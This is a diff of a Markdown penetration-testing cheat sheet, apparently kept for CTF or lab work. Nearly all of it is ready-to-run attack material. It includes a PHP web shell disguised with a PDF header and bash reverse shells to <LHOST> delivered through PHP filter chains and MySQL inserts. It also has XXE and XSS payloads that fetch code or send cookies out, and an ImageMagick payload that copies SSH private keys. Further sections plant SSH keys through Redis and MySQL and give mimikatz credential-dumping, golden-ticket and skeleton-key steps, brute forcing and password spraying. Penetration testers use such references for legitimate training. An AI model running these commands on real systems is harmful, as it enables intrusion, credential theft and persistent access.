-host -l <RHOST> <RHOST>
-dig @<RHOST> -x <RHOST>
-dig {a|txt|ns|mx} <RHOST>
-dig {a|txt|ns|mx} <RHOST> @ns1.<RHOST>
-dig axfr @<RHOST> <RHOST>    # zone transfer
+pip install bloodhound
+sudo apt-get install neo4j
+sudo apt-get install bloodhound
+```
+
+##### Installing and starting Database
+
+```c
+wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
+sudo echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
+sudo apt-get update
+sudo apt-get install apt-transport-https
+sudo apt-get install neo4j
+systemctl start neo4j
+```
+
+```c
+sudo neo4j start console
+sudo bloodhound --no-sandbox
+```
+
+>  http://localhost:7474/browser/
+
+#### BloodHound Python
+
+```c
+bloodhound-python -d <DOMAIN> -u <USERNAME> -p "<PASSWORD>" -gc <DOMAIN> -c all -ns <RHOST>
+bloodhound-python -u <USERNAME> -p '<PASSWORD>' -ns <RHOST> -d <DOMAIN> -c All
+```
+
+#### Certify
+
+```c
+.\Certify.exe find /vulnerable /currentuser
+```
+
+#### enum4linux-ng
+
+```c
+enum4linux-ng -a <RHOST>
 ```
 
 #### ldapsearch
@@ -518,38 +883,95 @@ ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.a
 ldapsearch -x -h <RHOST> -D "<USERNAME>"  -b "dc=<RHOST>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
 
-#### sslyze
+#### memcached
+
+>  https://github.com/pd4d10/memcached-cli
 
 ```c
-sslyze --heartbleed <RHOST>
+memcrashed / 11211/UDP
+
+npm install -g memcached-cli
+memcached-cli <USERNAME>:<PASSWORD>@<RHOST>:11211
+echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u 127.0.0.1 11211
+
+STAT pid 21357
+STAT uptime 41557034
+STAT time 1519734962
+
+sudo nmap <RHOST> -p 11211 -sU -sS --script memcached-info
+
+stats items
+stats cachedump 1 0
+get link
+get file
+get user
+get passwd
+get account
+get username
+get password
 ```
-#### SMB / NetBIOS
+
+#### NetBIOS
 
 ```c
 nbtscan <RHOST>
-enum4linux -a <RHOST>
+nmblookup -A <RHOST>
 ```
 
-#### JAWS
+#### rpclient
 
 ```c
-IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
+$ rpcclient -U "" <RHOST>
 ```
 
-### Vulnerability Analysis
+```c
+srvinfo
+netshareenum
+netshareenumall
+netsharegetinfo
+netfileenum
+netsessenum
+netdiskenum
+netconnenum
+getanydcname
+getdcname
+dsr_getdcname
+dsr_getdcnameex
+dsr_getdcnameex2
+dsr_getsitename
+enumdomusers
+enumdata
+enumjobs
+enumports
+enumprivs
+queryuser <USERNAME>
+```
 
-#### finger
+#### snmpwalk
 
 ```c
-./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <RHOST>
+snmpwalk -c public -v1 <RHOST>
+snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.34.1.3
+snmpwalk -v2c -c public <RHOST> .1
+snmpwalk -v2c -c public <RHOST> nsExtendObjects
+snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
+snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2
+snmpwalk -c public -v1 <RHOST> .1.3.6.1.2.1.1.5
+snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
+snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
+snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
+snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
 ```
 
 ### Web Application Analysis
 
-#### Asset Discovery
+#### Burp Suite
 
 ```c
-curl -s -k "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sed '/^\./d'
+Ctrl+r          // Sending request to repeater
+Ctrl+i          // Sending request to intruder
+Ctrl+Shift+b    // base64 encoding
+Ctrl+Shift+u    // URL decoding
 ```
 
 #### ffuf
@@ -590,57 +1012,10 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-s
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/ext/logs/FUZZ -e .log
 ```
 
-##### No 404 Header
-
-```c
-ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/no404/FUZZ -fs 669
-```
-
-##### Param Mining
-
-```c
-ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/param/data?FUZZ=1
-```
-
 ##### Rate Limiting
 
 ```c
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://<RHOST>/cd/rate/FUZZ -mc 200,429
-```
-
-##### IDOR Testing
-
-```c
-seq 1 1000 | ffuf -w - -u http://<RHOST>/cd/pipes/user?id=FUZZ
-```
-
-###### Script for IDOR Testing
-
-```c
-#!/bin/bash
-
-while read i
-do
-  if [ "$1" == "md5" ]; then
-    echo -n $i | md5sum | awk '{ print $1 }'
-  elif [ "$1" == "b64" ]; then
-    echo -n $i | base64
-  else
-    echo $i
-  fi
-done
-```
-
-###### Use Script above for Base64 decoding
-
-```c
-seq 1 1000 | /usr/local/bin/hashit b64 | ffuf -w - -u http://<RHOST>/cd/pipes/user2?id=FUZZ
-```
-
-###### MD5 Discovery using the Script
-
-```c
-seq 1 1000 | /usr/local/bin/hashit md5 | ffuf -w - -u http://<RHOST>/cd/pipes/user3?id=FUZZ
 ```
 
 ##### Virtual Host Discovery
@@ -653,6 +1028,13 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.
 
 ```c
 ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<RHOST>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
+```
+
+#### GitTools
+
+```c
+./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
+./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
 ```
 
 #### Gobuster
@@ -693,6 +1075,7 @@ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-li
 ##### DNS Recon
 
 ```c
+gobuster dns -d <RHOST> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 ```
 
@@ -700,6 +1083,7 @@ gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/sub
 
 ```c
 gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
 ```
 
 ##### Specifiy User Agent
@@ -721,6 +1105,13 @@ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
 http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
 ```
 
+##### Null Byte
+
+```c
+%00
+0x00
+```
+
 ##### Encoded Traversal Strings
 
 ```c
@@ -736,11 +1127,34 @@ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
 ...\.\
 ```
 
-##### Base64 Execution Bypass
+##### php://filter Wrapper
+
+> https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb
+
+> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+
+> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter
+
+```c
+url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
+```
 
 ```c
 http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
+http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
 base64 -d <FILE>.php
+```
+
+##### Django, Rails, or Node.js Web Application Header Values
+
+```c
+Accept: ../../../../.././../../../../etc/passwd{{
+Accept: ../../../../.././../../../../etc/passwd{%0D
+Accept: ../../../../.././../../../../etc/passwd{%0A
+Accept: ../../../../.././../../../../etc/passwd{%00
+Accept: ../../../../.././../../../../etc/passwd{%0D{{
+Accept: ../../../../.././../../../../etc/passwd{%0A{{
+Accept: ../../../../.././../../../../etc/passwd{%00{{
 ```
 
 ##### Linux Files
@@ -1088,6 +1502,128 @@ C:/Windows/System32/inetsrv/config/applicationHost.config
 C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
 ```
 
+#### PDF PHP Inclusion
+
+Create a file with a PDF header, which contains PHP code.
+
+```c
+%PDF-1.4
+
+<?php
+    system($_GET["cmd"]);
+?>
+```
+
+```c
+http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
+```
+
+#### PHP Upload Filter Bypasses
+
+```c
+.sh
+.cgi
+.inc
+.txt
+.pht
+.phtml
+.phP
+.Php
+.php3
+.php4
+.php5
+.php7
+.pht
+.phps
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.php%00.jpeg
+```
+
+```c
+<FILE>.php%20
+<FILE>.php%0d%0a.jpg
+<FILE>.php%0a
+<FILE>.php.jpg
+<FILE>.php%00.gif
+<FILE>.php\x00.gif
+<FILE>.php%00.png
+<FILE>.php\x00.png
+<FILE>.php%00.jpg
+<FILE>.php\x00.jpg
+mv <FILE>.jpg <FILE>.php\x00.jpg
+```
+
+#### PHP Filter Chain Generator
+
+> https://github.com/synacktiv/php_filter_chain_generator
+
+```c
+python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
+python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
+python3 php_filter_chain_generator.py --chain """<?php echo shell_exec(id); ?>"""
+python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
+python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
+```
+
+```c
+http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
+```
+
+```c
+python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
+[+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
+```
+
+#### PHP Generic Gadget Chains (PHPGGC)
+
+```c
+phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
+```
+
+#### Server-Side Request Forgery (SSRF)
+
+```c
+https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
+```
+
+#### Server-Side Template Injection (SSTI)
+
+##### Fuzz String
+
+> https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
+
+```c
+${{<%[%'"}}%\.
+```
+
+##### Magic Payload
+
+> https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
+
+```c
+{{ ‘’.__class__.__mro__[1].__subclasses__() }}
+```
+
+#### Upload Vulnerabilities
+
+```c
+ASP / ASPX / PHP / PHP3 / PHP5: Webshell / Remote Code Execution
+SVG: Stored XSS / Server-Side Request Forgery
+GIF: Stored XSS
+CSV: CSV Injection
+XML: XXE
+AVI: Local File Inclusion / Server-Side request Forgery
+HTML/JS: HTML Injection / XSS / Open Redirect
+PNG / JPEG: Pixel Flood Attack
+ZIP: Remote Code Exection via Local File Inclusion
+PDF / PPTX: Server-Side Request Forgery / Blind XXE
+```
+
 #### wfuzz
 
 ```c
@@ -1115,7 +1651,7 @@ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<
 ##### Domain
 
 ```c
-wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>.<tld>' -u http://<RHOST>/
+wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/
 ```
 
 ##### Subdomain
@@ -1171,16 +1707,227 @@ target=<RHOST>; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-w
 wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
 ```
 
-### Database Analysis
+#### XML External Entity (XXE)
 
-#### Basic Commands
+##### Skeleton Payload Request
 
 ```c
-show databases;
-use <DATABASE>;
-show tables;
-SELECT * FROM *;
+GET / HTTP/1.1
+Host: <RHOST>:<RPORT>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Length: 136
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php" >]>
+<foo>&xxe;</foo>
+```
+
+##### Payloads
+
+```c
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
+ <stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
+```
+
+```c
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
+```
+
+```c
+username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
+```
+
+#### Cross-Site Scripting (XSS)
+
+```c
+<script>alert('XSS');</script>
+<script>alert(document.cookies)</script>
+<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
+<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
+<script>user.changeEmail('user@domain');</script>
+```
+
+### Database Analysis
+
+#### MongoDB
+
+```c
+mongo "mongodb://localhost:27017"
+```
+
+```c
+> use <DATABASE>;
+> show tables;
+> show collections;
+> db.system.keys.find();
+> db.users.find();
+> db.getUsers();
+> db.getUsers({showCredentials: true});
+> db.accounts.find();
+> db.accounts.find().pretty();
+> use admin;
+```
+
+##### User Password Reset to "12345"
+
+```c
+> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
+```
+
+#### MSSQL
+
+##### Show Database Content
+
+```c
+1> SELECT name FROM master.sys.databases
+2> go
+```
+
+##### OPENQUERY
+
+```c
+1> select * from openquery("web\clients", 'select name from master.sys.databases');
+2> go
+```
+
+```c
+1> select * from openquery("web\clients", 'select name from clients.sys.objects');
+2> go
+```
+
+##### Binary Extraction as Base64
+
+```c
+1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
+2> go > export.txt
+```
+
+#### MySQL
+
+```c
+mysql -u root -p
 mysql -u <USERNAME> -h <RHOST> -p
+```
+
+```c
+> show databases;
+> use <DATABASE>;
+> show tables;
+> describe <TABLE>;
+> SELECT * FROM Users;
+> SELECT Username,Password FROM Users;
+```
+
+##### Update User Password
+
+```c
+mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
+```
+
+##### Drop a Shell
+
+```c
+mysql> \! /bin/sh
+```
+
+##### xp_cmdshell
+
+```c
+SQL> EXEC sp_configure 'Show Advanced Options', 1;
+SQL> reconfigure;
+SQL> sp_configure;
+SQL> EXEC sp_configure 'xp_cmdshell', 1;
+SQL> reconfigure
+SQL> xp_cmdshell "whoami"
+```
+
+```c
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+```
+
+##### Insert Code to get executed
+
+```c
+mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
+```
+
+##### Write SSH Key into authorized_keys2 file
+
+```c
+mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
+```
+
+##### Linked SQL Server Enumeration
+
+```c
+SQL> SELECT user_name();
+SQL> SELECT name,sysadmin FROM syslogins;
+SQL> SELECT srvname,isremote FROM sysservers;
+SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
+```
+
+#### NoSQL Injection
+
+```c
+admin'||''==='
+```
+
+#### PostgreSQL
+
+```c
+postgres=# \c
+postgres=# \list
+postgres=# \c  <DATABASE>
+<DATABASE>=# \dt
+<DATABASE>=# TABLE <TABLE>;
+```
+
+#### Redis
+
+```c
+> AUTH <PASSWORD>
+> AUTH <USERNAME> <PASSWORD>
+> INFO SERVER
+> INFO keyspace
+> CONFIG GET *
+> SELECT <NUMBER>
+> KEYS *
+> GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
+> SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"admin\";auth|s:4:\"True\";" # the value "s:8" has to match the length of the username
+```
+
+##### Enter own SSH Key
+
+```c
+redis-cli -h <RHOST>
+echo "FLUSHALL" | redis-cli -h <RHOST>
+(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt
+cat /PATH/TO/FILE/<FILE>.txt | redis-cli -h <RHOST> -x set s-key
+<RHOST>:6379> get s-key
+<RHOST>:6379> CONFIG GET dir
+1) "dir"
+2) "/var/lib/redis"
+<RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh
+OK
+<RHOST>:6379> CONFIG SET dbfilename authorized_keys
+OK
+<RHOST>:6379> CONFIG GET dbfilename
+1) "dbfilename"
+2) "authorized_keys"
+<RHOST>:6379> save
+OK
+```
+
+#### sqlcmd
+
+```c
+sqlcmd -S <RHOST> -U <USERNAME>
 ```
 
 #### SQL Injection
@@ -1312,28 +2059,44 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
-#### sqsh
-
-```c
-sqsh -S <RHOST> -U <USERNAME>
-```
-
 #### SQL Truncation Attack
 
 ```c
 'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
 ```
 
-#### XPATH Injection
+#### sqlite3
 
 ```c
-test' or 1=1 or 'a'='a
-test' or 1=2 or 'a'='a
-'or substring(Password,1,1)='p' or'    # checking letter "p" on the beginning of the password
-'or substring(Password,2,1)='p' or'    # checking letter "p" on the second position of the password
+sqlite3 <DATABASE>.db
+sqlite> .tables
+sqlite> select * from users;
+```
+
+#### sqsh
+
+```c
+sqsh -S <RHOST> -U <USERNAME>
 ```
 
 ### Password Attacks
+
+#### CrackMapExec
+
+```c
+crackmapexec smb <RHOST> -u '' -p '' --shares
+crackmapexec smb <RHOST> -u <USERNAME> -p <PASSWORD> --shares
+crackmapexec winrm -u usernames.txt -p '<PASSWORD>' -d <DOMAIN> <RHOST>
+crackmapexec winrm <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
+crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
+crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
+crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
+crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
+crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
+crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
+crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
+crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -m modules/credentials/mimikatz.py
+```
 
 #### fcrack
 
@@ -1341,17 +2104,102 @@ test' or 1=2 or 'a'='a
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
 ```
 
-#### LaZagne
+#### hashcat
+
+> https://hashcat.net/hashcat/
+
+> https://hashcat.net/wiki/doku.php?id=hashcat
+
+> https://hashcat.net/cap2hashcat/
+
+> https://hashcat.net/wiki/doku.php?id=example_hashes
 
 ```c
-laZagne.exe all
+hashcat --example-hashes
+```
+
+```c
+hashcat -m 0 md5 /usr/share/wordlists/rockyou.txt
+hashcat -m 100 sha-1 /usr/share/wordlists/rockyou.txt
+hashcat -m 1400 sha256 /usr/share/wordlists/rockyou.txt
+hashcat -m 3200 bcrypt /usr/share/wordlists/rockyou.txt
+hashcat -m 900 md4 /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 ntlm /usr/share/wordlists/rockyou.txt
+hashcat -m 1800 sha512 /usr/share/wordlists/rockyou.txt
+hashcat -m 160 hmac-sha1 /usr/share/wordlists/rockyou.txt
+hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
+hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
+```
+
+##### Cracking ASPREPRoast Password File
+
+```c
+hashcat -m 18200 -a 0 <FILE> <FILE>
+```
+
+##### Cracking Kerberoasting Password File
+
+```c
+hashcat -m 13100 --force <FILE> <FILE>
+```
+
+##### Bruteforce based on the Pattern
+
+```c
+hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
+```
+
+##### Generate Password Candidates: Wordlist + Pattern
+
+```c
+hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout
+```
+
+##### Generate NetNLTMv2 with internalMonologue and crack with hashcat
+
+```c
+InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
+```
+
+###### Result
+
+```c
+spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
+```
+
+##### Crack with hashcat
+
+```c
+hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
+```
+
+##### Rules
+
+> https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule
+
+##### Cracking with OneRuleToRuleThemAll.rule
+
+```c
+hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
 ```
 
 #### Hydra
 
 ```c
+hydra <RHOST> -l <USERNAME> -P /usr/share/wordlists/list ftp|ssh|smb://<RHOST>
+```
+
+```c
 export HYDRA_PROXY=connect://127.0.0.1:8080
 unset HYDRA_PROXY
+```
+
+```c
+hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
+```
+
+```c
+hydra <RHOST> http-post-form -L /usr/share/wordlists/list "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT> -P /usr/share/wordlists/list
 
 hydra <RHOST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f
 
@@ -1367,12 +2215,89 @@ john --rules --wordlist=/usr/share/wordlists/rockyou.txt <FILE>
 john --show <FILE>
 ```
 
-### Exploitation Tools
+#### Kerbrute
 
-#### ImageTragick Polyglot Attack
+##### User Enumeration
 
 ```c
-poc.svg
+./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
+```
+
+##### Password Spray
+
+```c
+./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
+```
+
+#### LaZagne
+
+```c
+laZagne.exe all
+```
+
+#### mimikatz
+
+##### Dump Hshes
+
+```c
+mimikatz.exe
+sekurlsa::minidump /users/admin/Desktop/lsass.DMP
+sekurlsa::LogonPasswords
+meterpreter > getprivs
+meterpreter > creds_all
+meterpreter > golden_ticket_create
+```
+
+##### Pass the Ticket
+
+```c
+.\mimikatz.exe
+mimikatz # sekurlsa::tickets /export
+mimikatz # kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
+klist
+dir \\<RHOST>\admin$
+```
+
+##### Forging Golden Ticket
+
+```c
+C:\> .\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # lsadump::lsa /inject /name:krbtgt
+mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
+mimikatz # misc::cmd
+klist
+dir \\<RHOST>\admin$
+```
+
+##### Skeleton Key
+
+```c
+mimikatz # privilege::debug
+mimikatz # misc::skeleton
+net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
+dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
+```
+
+#### pypykatz
+
+```c
+pypykatz lsa minidump lsass.dmp
+```
+
+### Exploitation Tools
+
+#### ImageTragick
+
+> https://imagetragick.com/
+
+#### MSL / Polyglot Attack
+
+> https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html
+
+##### poc.svg
+
+```c
 <image authenticate='ff" `echo $(cat /home/<USERNAME>/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
   <read filename="pdf:/etc/passwd"/>
   <get width="base-width" height="base-height" />
@@ -1382,16 +2307,28 @@ poc.svg
   <image xlink:href="msl:poc.svg" height="100" width="100"/>
   </svg>
 </image>
+```
 
-$ convert poc.svg poc.png
+```c
+convert poc.svg poc.png
+cp /tmp/poc.svg /var/www/html/convert_images/
 ```
 
 #### Metasploit
 
-##### General Usage
-
 ```c
+sudo msfdb run                   // start database
 sudo msfdb init                  // database initialization
+msfdb status                     // database status
+msf6> workspace                    // metasploit workspaces
+msf6> workspace -a <WORKSPACE>     // add a workspace
+msf6> workspace -r <WORKSPACE>     // rename a workspace
+msf6> workspace -d <WORKSPACE>     // delete a workspace
+msf6> workspace -D                 // delete all workspaces
+msf6> db_nmap <OPTIONS>            // execute nmap and add output to database
+msf6> hosts                        // reads hosts from database
+msf6> services                     // reads services from database
+msf6 > vulns                       // displaying vulnerabilities
 msf6 > search                      // search within metasploit
 msf6 > set RHOST <RHOST>           // set remote host
 msf6 > set RPORT <RPORT>           // set remote port
@@ -1405,14 +2342,15 @@ msf6 > encoder                     // using module encoder
 msf6 > nop                         // using module nop
 msf6 > show sessions               // displays all current sessions
 msf6 > sessions -i 1               // switch to session 1
-msf6 > db_nmap -sC <RHOST>         // using nmap
+msf6 > sessions -u <ID>            // upgrading shell to meterpreter
+msf6 > sessions -k <ID>            // kill specific session
+msf6 > sessions -K                 // kill all sessions
 msf6 > jobs                        // showing all current jobs
-msf6 > hosts                       // displaying hosts
-msf6 > services                    // displaying services
-msf6 > vulns                       // displaying vulnerabilities
